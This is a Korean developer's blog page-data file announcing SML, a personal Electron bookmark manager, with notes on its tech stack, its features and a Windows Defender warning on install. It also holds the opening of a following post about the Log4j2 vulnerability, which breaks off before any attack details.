{"componentChunkName":"component---src-templates-post-template-index-tsx","path":"/my_project/211229_introduce-sml/","result":{"data":{"cur":{"id":"b6c94732-0a00-5617-8425-a398234997c4","html":"<h1 id=\"즐겨찾기-관리-프로그램을-만들다\" style=\"position:relative;\"><a href=\"#%EC%A6%90%EA%B2%A8%EC%B0%BE%EA%B8%B0-%EA%B4%80%EB%A6%AC-%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%A8%EC%9D%84-%EB%A7%8C%EB%93%A4%EB%8B%A4\" aria-label=\"즐겨찾기 관리 프로그램을 만들다 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>즐겨찾기 관리 프로그램을 만들다.</h1>\n<p>예전 <a href=\"https://elfinlas.github.io/til/211207_devnote/\">포스팅</a> 에서 공개했던 프로그램을 완성했다.\n사실 완성이라고 하기엔 뭐하고 쓸만할 정도가 되었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABYlAAAWJQFJUiTwAAACj0lEQVQoz5WRy04UQRSG5wVc+hI+gbQLxcTH0AWyMnHBxsRkuAyJ4MLgSiHMvcFLNCYG2ckrGIEEZkYDOhfm2tMz1VXdVd3VfX7TzTDRpSf5UudUnfz1n5zU4wf3b2QyS3tray/2F9OZL+l0Zn8xvfoPCwtPEhanb5n9q76n6cyXjeVne4cvtw8OFp/fTS0tr9zbzhXw7v0HFMsmiuWdS0rmtC7F57T+qyfOzV28LZZgbqyhsLr8KFWr1e4o5WsAMcHk/F/Ub8Vw2DibS52cnMx2uz0MhzY8z6Uxl1Tvxygac0W+79P5xREJYZNSASmlSAhB3V6PLMsmTwxJDtohlEazXp9PVSqV2Xa7g35/AM45uSqEJYC+A3ixXwDCPof2Ba4ijCI4nMP1JBC5FDlWGOkQjWbzUjB2N7RtOI5DQmp0GaEzJoxcAkD41rhAq1cFvBoiImitMRqNwLkL0oJCNgijIBZsTARtOxk5CHzyQySCMcyjxFH06wjq8Csi5SZ1IjgeTwQ5heP+RHDiMP4tbpCeRyog9B1CjxG4vBRsDarg7GeS00SQMQYhPFA4cXg18unp6axlWSRVvAAVeX5EPUbUGUfEPCIgIuackSM5KV9THEGgybZtchxBUeJwoMMgRL3ZeJiqVqvJyK7rQkkJGcQjA+0xIPzLJdjtI3zv/EDLsqZLSRy6HhAJRGwQIiS0LlrzqePj49uj0Ui7rquVkoFwpbYdqYdMai5kfKeb7a6uD5mWUibEvYwx7Thce66jPWYr7nBUqtW51Pr6+jXTNG8WCgUjm83OFAs5Y7ecM96YOaNUzBnZbM74/OmjsbP1ytjc2jLy+XyCaZpGqVQycvmiUSjvzLze3Ly1kslc/wNizTD0wA9BfAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/8728b9aed7df835bf766f441010696b2/7c297/img_01.webp 180w,\n/static/8728b9aed7df835bf766f441010696b2/33ecc/img_01.webp 360w,\n/static/8728b9aed7df835bf766f441010696b2/df77d/img_01.webp 720w,\n/static/8728b9aed7df835bf766f441010696b2/5c666/img_01.webp 1080w,\n/static/8728b9aed7df835bf766f441010696b2/95f20/img_01.webp 1440w,\n/static/8728b9aed7df835bf766f441010696b2/61a5c/img_01.webp 3024w\"\n              sizes=\"(max-width: 720px) 100vw, 720px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/8728b9aed7df835bf766f441010696b2/e9ea2/img_01.png 180w,\n/static/8728b9aed7df835bf766f441010696b2/53918/img_01.png 360w,\n/static/8728b9aed7df835bf766f441010696b2/242a6/img_01.png 720w,\n/static/8728b9aed7df835bf766f441010696b2/b4ad3/img_01.png 1080w,\n/static/8728b9aed7df835bf766f441010696b2/89066/img_01.png 1440w,\n/static/8728b9aed7df835bf766f441010696b2/cae0a/img_01.png 3024w\"\n            sizes=\"(max-width: 720px) 100vw, 720px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/8728b9aed7df835bf766f441010696b2/242a6/img_01.png\"\n            alt=\"img 01\"\n            title=\"img 01\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>예전에 공개한 버전에서 UI를 조금 바꾸고 변경했다.<br>\n아직 미흡한 부분이 남아있지만…<br>\nSML을 만들면서 몇 가지 목표가 있었고, 그 중 한가지가 <strong>내가 필요해서 만들었으니 나에게 맞는 기능을 만들어 써보자</strong> 였다.</p>\n<p>사실 프로그래머 개발자 이런게 뭐 별거인가?<br>\n그냥 내가 필요해서 만드는게 그 직업군이지.</p>\n<p>무튼 그래서 내가 만들었고, 현재 잘 쓰고 있다.<br>\n노션에 정리할 때 보다 더 편리한거 같다.</p>\n<p>공개는 <a href=\"https://github.com/elfinlas/SML\">Github</a> 에 해뒀고, 다운로드는 <a href=\"https://github.com/elfinlas/SML/releases\">릴리즈</a> 페이지에서 가능하다.</p>\n<br>\n<p>소스코드는…정리좀 하고 올릴 예정이다.<br>\n너무 하나에 몰아두고 짜서 보기 어렵다…<br>\n뭐 누가 보겠느냐 싶겠지만 그래도 추가 기능 개발 및 향후 내가 만들 웹 서비스에 연동을 위해서 몇 가지 사전 작업을 해둬야 해서…</p>\n<p>곧 리펙토링 및 코드 정리가 끝나면 오픈할 예정이다.<br>\n참고로…<br>\n난 Javascript 라는것을 이번에 처음 공부하며 써보기 시작했다.<br>\n주로 Java 백엔드만 짜다가 제대로 공부해서 해보는 중이다.<br>\n뭐 이것도 사실 제대로 공부 안하고 일단 부딪쳐 보자 식으로 해본거지만…</p>\n<p>Node를 공부하다가 일렉트론을 생각하게 되어 잠시 샛길로 빠져 만든 것이다.<br>\n그래서 코드가 조잡하고 그럴 수 있다. (밑밥?)<br>\n일렉트론…좀 더 제대로 공부하면 더 좋은(?) 결과를 낼 수 있었지만…<br>\n이번 SML은 사실 구동과 기능의 정상 작동에 포커스를 맞춰서 잘못 개발했을 수도 있다.</p>\n<p>여담이지만 이걸 마지막으로 일렉트론은 접어둘 생각이다.<br>\n왜냐하면 곧 메인 개발을 해야 할 부분이 Node쪽이라서 그렇다.</p>\n<p>정리하자면…소스코드는 정리하고 공개할 예정이며…</p>\n<p>코드 오픈의 이유는 <strong>필요한 사람이 직접 추가 기능을 개발해서 쓰라는 의미</strong>로 오픈하는 거니 코드의 품질이나 개발 방법론은 <strong>잠시 접어두자.</strong></p>\n<h2 id=\"뭐로-만들고-구성이-어떻게-되나\" style=\"position:relative;\"><a href=\"#%EB%AD%90%EB%A1%9C-%EB%A7%8C%EB%93%A4%EA%B3%A0-%EA%B5%AC%EC%84%B1%EC%9D%B4-%EC%96%B4%EB%96%BB%EA%B2%8C-%EB%90%98%EB%82%98\" aria-label=\"뭐로 만들고 구성이 어떻게 되나 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>뭐로 만들고 구성이 어떻게 되나?</h2>\n<p>일렉트론으로 만들었고, 화면단은 <strong>Bootstrap 5</strong>를 이용해서 만들었다.<br>\n원래는 지금 공부하는 리엑트를 적용해서 해볼까 했는데 이거 적용해서 하려면 너무 오래 걸릴거 같아서 그냥 부트스트랩으로 만들었다.<br>\n그리고 <strong>jQuery를 이번에는 쓰지 말자</strong>라고 결심을 해서 쓰지 않았다.<br>\n덕분에 바닐라.js ? 그냥 순수한 자바스크립트를 바닐라라고 부르는 것도 이번에 처음 알았다 ’_‘;;</p>\n<p>디비쪽은 <strong>SQLite</strong>를 사용했다.<br>\n이런 작은 프로그램에서 쓰기엔 최고다.</p>\n<p>백업과 복원을 위해서 JSON 형식으로 처리했다.</p>\n<p>그 외 특이한 기술은 없고 Select 처리를 위해 치리오? 발음을 몰라서… <a href=\"http://github.com/cheeriojs/cheerio\">cheerio</a>를 사용했다.<br>\n알람창 이쁜거를 위해 <strong>sweetalert2</strong>를 사용했다.</p>\n<h2 id=\"기능은\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%EB%8A%A5%EC%9D%80\" aria-label=\"기능은 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>기능은?</h2>\n<p>간단하다.<br>\n핵심 기능은 링크 데이터의 CRUD 이게 끝이다.<br>\n부가 기능으로 페이징과 검색정도?</p>\n<p>데이터 등록과 수정은 비슷하니 굳이 서술하지 않겠다.<br>\n다만 태그 기능에 대해 약간 부연 설명을 하자면…</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 60.55555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABYlAAAWJQFJUiTwAAACD0lEQVQoz6WRTW8SQRyH91NgTQqtLcQeqiZYIhdjlrK8GL1a4wESVgpoezJxl90dZnfDso1HDvZS4GO02PgJBL1yUsoH4KalM3T+ZgaatGo0jZM8+c0kv3kyL1J0ORgMry5pCzdC+kJgUZsRFLkcCmuR1TXt7npUu7ce1cIra9qtpYj2a+9mIPh2I3Qb3V+M3JEexGJPM5kMpDOPIZlMgaKkQUmlQZY3YW/vHXS7H+DoqAuHh104Pv4IrVYbkkoKkrynpEWmlDQ8efQQNjeibyRVfZmxbXvq+/4Zx/M80mj4xHVdMhgMCABcYTweE96p1+vE933ieXXS8OqnhoNBfVV+LeVyuayu64BQjSGEmGFaTDcQ03Wdfer1GAAwQggjlIr5cDhkpmkyTddFWmaVWVWd1iwEpe3tHalQKGRrtRrYts3mgOM4YJom9Pt94IMQApRSMT8ZjQDbNu8L8GwP5Y5SqbQrhAghIcQYs4siF/Z6PZjSKUwmE6BkJhydjABjLBBCvgdjyteVSuXvwv6Xz0Lyg0zg+9kp8Dt/HX77XWjb/xbyKzSbTWh3OnDQOhC0O214v79/LeE5L8xLzLIsZhjGFfhHXHQuIYTlcnlHUlVVfIrjOMxxnPN5ClzX/SOXO3MoP604YT6fz1arVfFm/0uxWNyVYrFYQJblZ7IsP5dleWue12UrkUi8iMfjKz8BUUYmLf/0kJoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/70c032cda9c800a885a37f4d3743dcac/7c297/img_02.webp 180w,\n/static/70c032cda9c800a885a37f4d3743dcac/33ecc/img_02.webp 360w,\n/static/70c032cda9c800a885a37f4d3743dcac/df77d/img_02.webp 720w,\n/static/70c032cda9c800a885a37f4d3743dcac/5c666/img_02.webp 1080w,\n/static/70c032cda9c800a885a37f4d3743dcac/95f20/img_02.webp 1440w,\n/static/70c032cda9c800a885a37f4d3743dcac/61a5c/img_02.webp 3024w\"\n              sizes=\"(max-width: 720px) 100vw, 720px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/70c032cda9c800a885a37f4d3743dcac/e9ea2/img_02.png 180w,\n/static/70c032cda9c800a885a37f4d3743dcac/53918/img_02.png 360w,\n/static/70c032cda9c800a885a37f4d3743dcac/242a6/img_02.png 720w,\n/static/70c032cda9c800a885a37f4d3743dcac/b4ad3/img_02.png 1080w,\n/static/70c032cda9c800a885a37f4d3743dcac/89066/img_02.png 1440w,\n/static/70c032cda9c800a885a37f4d3743dcac/cae0a/img_02.png 3024w\"\n            sizes=\"(max-width: 720px) 100vw, 720px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/70c032cda9c800a885a37f4d3743dcac/242a6/img_02.png\"\n            alt=\"img 02\"\n            title=\"img 02\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>위는 데이터 추가할 때 나오는 사진인데 모달 하단에는 태그를 위한 두 개의 선택 옵션이 있다.<br>\n하나는 기존에 추가된 태그를 선택하는 <strong>select</strong> 이고, 하나는 새로운 태그를 추가할 때 쓰는 <strong>input</strong> 이다.<br>\n이거 두개를 통합해서 사용하는 select 를 찾아봤는데… 죄다 jQuery 의존이 강하게 엮여있거나 vue, react 등으로 개발된 것들이었다.</p>\n<p>내가 직접 개발하기엔 시간도 오래 걸리고 해서 결국 저렇게 뻘짓으로 개발해뒀다.<br>\n혹시 더 좋은 라이브러리나 방법이 있다면 공유 해주시면 감사하겠다.</p>\n<p>백업의 경우 현재 SQLite에 저장된 모든 데이터를 JSON 파일로 뽑아서 특정 경로에 저장한다.<br>\nMac의 경우 자신의 홈디렉토리에 SML 디렉토리에 저장한다.<br>\n그런데 윈도우는 내가 안써봐서 이상한 경로에 저장하는 듯 한다.</p>\n<p>appData였나 무튼 추가하면 알림에 어느 경로에 저장되는지 표시는 뜨게 해두었다.</p>\n<h2 id=\"윈도우-문제\" style=\"position:relative;\"><a href=\"#%EC%9C%88%EB%8F%84%EC%9A%B0-%EB%AC%B8%EC%A0%9C\" aria-label=\"윈도우 문제 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>윈도우 문제</h2>\n<p>윈도우를 내가 안써서 잘 모르겠다.<br>\n일렉트론 빌드로 윈도우용 exe를 만들었고, 설치할 때 c:\\program files 인가 경로로 깔면 권한인가 뭐 때문에 정상적으로 안되는거 같았다.<br>\n그래서 테스트 환경에서는 d:\\ 에 새로운 경로를 만들고 거기에 설치를 하니 잘 되었다.<br>\n그런데 설치 완료 후 아래와 같이 윈도우 디팬더에서 트로이잔이 나온다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 77.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAABdElEQVQ4y3VT7Y7DIAzj/V+y0qT92Hb9XFsKAXJy1nSB0yFZ0ECNkxi3bRvv+87HcVwIIbD3XuI6A4gTEccYBVgr8I19h0VKSaCbOWfZBDkIlagdIRIfIQpSLhJzu/eXMr0ZhEpeSqlI8K2IlJlS5pgwf2JCiLShRNNQhTZFZGDJMKCsVl7Y+ZNwXdeLAIBiraHGbGlknbPMEIA7RKEWXVPGYRAvy5vneZFYO67GpCx1BKGWQwihDoSqBISPx4OfzyerC1QdgH25PCWOsa61sxawCofpzcuKDn86rZnoBfIfZT6MQiG0PqpSfq88L4sohyo7QCDnA+q8XWckZavMEtJ5gXb79Xpx3/c8DAPP88xEkX0g3nztANe6XTv80/c8jiNP0yTz7XbjrusE9/v9c44KryHz6em/hILT2PCYqgPUHvm0ytfwpfKna9+lvhQlsnZqR2v0fxXCsIGgJFcdtAQCE7sIrQKrMFKsug+11sCtUiX8Bdi9mmx/s8GPAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/40e8c8810ebc7aa566d3baa1aaed5e7a/7c297/img_03.webp 180w,\n/static/40e8c8810ebc7aa566d3baa1aaed5e7a/33ecc/img_03.webp 360w,\n/static/40e8c8810ebc7aa566d3baa1aaed5e7a/df77d/img_03.webp 720w,\n/static/40e8c8810ebc7aa566d3baa1aaed5e7a/ffd27/img_03.webp 755w\"\n              sizes=\"(max-width: 720px) 100vw, 720px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/40e8c8810ebc7aa566d3baa1aaed5e7a/e9ea2/img_03.png 180w,\n/static/40e8c8810ebc7aa566d3baa1aaed5e7a/53918/img_03.png 360w,\n/static/40e8c8810ebc7aa566d3baa1aaed5e7a/242a6/img_03.png 720w,\n/static/40e8c8810ebc7aa566d3baa1aaed5e7a/3369e/img_03.png 755w\"\n            sizes=\"(max-width: 720px) 100vw, 720px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/40e8c8810ebc7aa566d3baa1aaed5e7a/242a6/img_03.png\"\n            alt=\"img 03\"\n            title=\"img 03\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>왜 이런지 나도 잘 모르겠지만…<br>\n왠지 개발자 서명이 안되어서 그런게 아닐까 싶다.</p>\n<p>그래서 github Readme 에도 찝찝한 사람은 직접 빌드해서 쓰라고 명시해뒀다.<br>\n그리고 조만간 코드 오픈도 되니까 뭔가 문제가 있는 코드가 있었다면 메일이나 다른 채널로 알려주지 않을까 싶다 ㅎㅎ</p>\n<h2 id=\"그래서-결론은\" style=\"position:relative;\"><a href=\"#%EA%B7%B8%EB%9E%98%EC%84%9C-%EA%B2%B0%EB%A1%A0%EC%9D%80\" aria-label=\"그래서 결론은 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>그래서 결론은?</h2>\n<p>이번 프로그램을 배포 후 몇 가지 건의를 받은 것도 있는데 이 부분은 개발을 해서 버전 업을 할 예정이다.<br>\n거기까지 해두고 내가 만들려던 서비스를 만들어갈 예정이다.<br>\n뭐 이미 너무 아이디어가 공개되어 있어서 오픈할까 했지만 그래도 직접 만든 후 오픈하는게 좋지 않을까 싶어서 언급을 안하려 한다.</p>\n<p>깃허브 릴리즈 노트 같은것도 이쁘게 꾸며보고 싶었지만…<br>\n시간이 부족해서…<br>\n그냥 여기까지만 해두려 한다.</p>\n<p>해당 프로그램이 유용했다면 Github의 Star 한번 부탁드리고, 의견이나 버그 등이 있다면 메일로 부탁한다.<br>\n이 프로그램이 유용했기를 바라면서 다음 버전으로 인사드리겠다.</p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EB%AD%90%EB%A1%9C-%EB%A7%8C%EB%93%A4%EA%B3%A0-%EA%B5%AC%EC%84%B1%EC%9D%B4-%EC%96%B4%EB%96%BB%EA%B2%8C-%EB%90%98%EB%82%98\">뭐로 만들고 구성이 어떻게 되나?</a></li>\n<li><a href=\"#%EA%B8%B0%EB%8A%A5%EC%9D%80\">기능은?</a></li>\n<li><a href=\"#%EC%9C%88%EB%8F%84%EC%9A%B0-%EB%AC%B8%EC%A0%9C\">윈도우 문제</a></li>\n<li><a href=\"#%EA%B7%B8%EB%9E%98%EC%84%9C-%EA%B2%B0%EB%A1%A0%EC%9D%80\">그래서 결론은?</a></li>\n</ul>\n</div>","excerpt":"즐겨찾기 관리 프로그램을 만들다. 예전 포스팅 에서 공개했던 프로그램을 완성했다.\n사실 완성이라고 하기엔 뭐하고 쓸만할 정도가 되었다.  예전에 공개한 버전에서 UI를 조금 바꾸고 변경했다. 아직 미흡한 부분이 남아있지만… SML을 만들면서 몇 가지 목표가 있었고, 그 중 한가지가 내가 필요해서 만들었으니 나에게 맞는 기능을 만들어 써보자 였다. 사실 프로그래머 개발자 이런게 뭐 별거인가? 그냥 내가 필요해서 만드는게 그 직업군이지. 무튼 그래서 내가 만들었고, 현재 잘 쓰고 있다. 노션에 정리할 때 보다 더 편리한거 같다. 공개는 Github 에 해뒀고, 다운로드는 릴리즈 페이지에서 가능하다. 소스코드는…정리좀 하고 올릴 예정이다. 너무 하나에 몰아두고 짜서 보기 어렵다… 뭐 누가 보겠느냐 싶겠지만 그래도 추가 기능 개발 및 향후 내가 만들 웹 서비스에 연동을 위해서 몇 가지 사전 작업을 해둬야 해서… 곧 리펙토링 및 코드 정리가 끝나면 오픈할 예정이다. 참고로… 난 Javasc…","frontmatter":{"date":"2021.12.29","title":"즐겨찾기 관리 프로그램 SML 배포","categories":"my_project","emoji":"📜"},"fields":{"slug":"/my_project/211229_introduce-sml/"}},"next":{"id":"cae0b1d5-14fb-5436-a1bd-0581a43dfd26","html":"<h2 id=\"요새-시끄러운-log4j2-공격\" style=\"position:relative;\"><a href=\"#%EC%9A%94%EC%83%88-%EC%8B%9C%EB%81%84%EB%9F%AC%EC%9A%B4-log4j2-%EA%B3%B5%EA%B2%A9\" aria-label=\"요새 시끄러운 log4j2 공격 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>요새 시끄러운 log4j2 공격…</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 700px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 39.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAABh0lEQVQY03WQ7ysDcQDG70+SkmQbOz9eKFJeUEvCxNnuRu3FRm1eMbzYCxR74dVqJWt29x2ZC1tuMjHaD3Fik5iabSys7e771e5qiTx9Xjxvnp76YBTA/2PC1zriqXde2BBCAhQQgqgSCKFcEEaBFgrgJKM2gJafUAA3gNZRT0M0HUIIiVCsbqrBdIxKOmkbp5WEt5HwKghaQXgbKYDrthWzRwMCKomi8FUqCGK5LJaK5c9CMSeIZQhFzML2BpMeW0BrYXsXgqN2jrJz5GJwzLzf1bNYM2LU5LJ5+np15djIpRj21sWlmMCd2887b18vMVtg2B1btrJ9jvDUZmxp/czqOJ3e413zocFOU622nziPhx0R0+zB4EbUHnk65DORZO4q8/H0XsxieqZ5LjBk3u0mGfWkr11Hq3S00rjTQYLmGVbzknlGCEXTnJ93Pr7x0TQXfzl5yN9UvCGIUQAnaIWeaZK1VVVrPXVbiTVJlYD+RDIujWW3vyCB+j6XkD1LCFAqUEK2/Q16Qk3zLTqZWgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0e32bfff29f0372fb45d54216e2f659f/7c297/thumbnail_spring.webp 180w,\n/static/0e32bfff29f0372fb45d54216e2f659f/33ecc/thumbnail_spring.webp 360w,\n/static/0e32bfff29f0372fb45d54216e2f659f/84c6d/thumbnail_spring.webp 700w\"\n              sizes=\"(max-width: 700px) 100vw, 700px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0e32bfff29f0372fb45d54216e2f659f/e9ea2/thumbnail_spring.png 180w,\n/static/0e32bfff29f0372fb45d54216e2f659f/53918/thumbnail_spring.png 360w,\n/static/0e32bfff29f0372fb45d54216e2f659f/a27c6/thumbnail_spring.png 700w\"\n            sizes=\"(max-width: 700px) 100vw, 700px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0e32bfff29f0372fb45d54216e2f659f/a27c6/thumbnail_spring.png\"\n            alt=\"thumbnail\"\n            title=\"thumbnail\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>요새 Log4J2 취약점 때문에 난리다.<br>\n사실 이 이슈가 알려진건 좀 되었다. (물론 일주일 전에 오픈된거로 알고 있긴 하지만…)<br>\n보안쪽은 이런 큰 문제가 터지면 바로 대응해야 한다.<br>\n조금만 늦게 대응하는 순간 비트코인 마냥 추락하는 거대한 손실을 껴안을 수 있다.<br>\n개발쪽은 역시 부지런해야 살아남는듯…</p>\n<p>사설이 길었다.<br>\n이번 이슈에 대해서는 많은 사람이 적었기에 따로 언급은 안하겠다.<br>\n정 궁금하신 분은 <strong><a href=\"https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389\">이곳 KISA</a></strong> 에서 확인해보기 바란다.</p>\n<p>나는 현재 개인적으로 돌리는 서비스가 있는데 Spring boot 기반으로 되어 있다.<br>\n저 이슈보자마자 바로 문제가 생기겠구나 싶어서 확인했다.<br>\n처리는 금방 했는데 블로그에는 좀 늦게 올리게 되었다.</p>\n<br>\n<h2 id=\"어떻게-공격이-들어오는가\" style=\"position:relative;\"><a href=\"#%EC%96%B4%EB%96%BB%EA%B2%8C-%EA%B3%B5%EA%B2%A9%EC%9D%B4-%EB%93%A4%EC%96%B4%EC%98%A4%EB%8A%94%EA%B0%80\" aria-label=\"어떻게 공격이 들어오는가 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 